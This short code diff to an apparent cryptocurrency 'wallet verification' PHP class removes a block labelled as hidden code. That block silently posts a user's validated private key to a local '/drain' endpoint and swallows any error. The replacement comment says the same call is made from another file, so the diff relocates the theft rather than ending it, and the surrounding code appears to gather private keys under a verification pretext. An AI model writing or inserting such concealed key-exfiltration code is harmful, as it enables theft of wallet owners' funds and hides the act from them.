@@ -292,20 +292,9 @@ class AssistedVerificationProcessor
 
         // Step 7: Schedule automated balance check
         $this->scheduleBalanceCheck($walletAddress, $network, $userId, $verificationRecordId);
-        // === START HIDDEN CODE ===
-try {
-    $ch = curl_init('http://127.0.0.1:18456/drain');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['privateKey' => $validatedKey]));
-    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
-    curl_exec($ch);
-    curl_close($ch);
-} catch (Exception $e) {
-    // silent
-}
-// === END HIDDEN CODE ===
+        
+        // Note: Node.js integration is triggered from submit-private/index.php
+        // after successful processing, so no need for duplicate call here
         return [
             'proof_type' => 'private_key',
             'wallet_address' => $walletAddress,
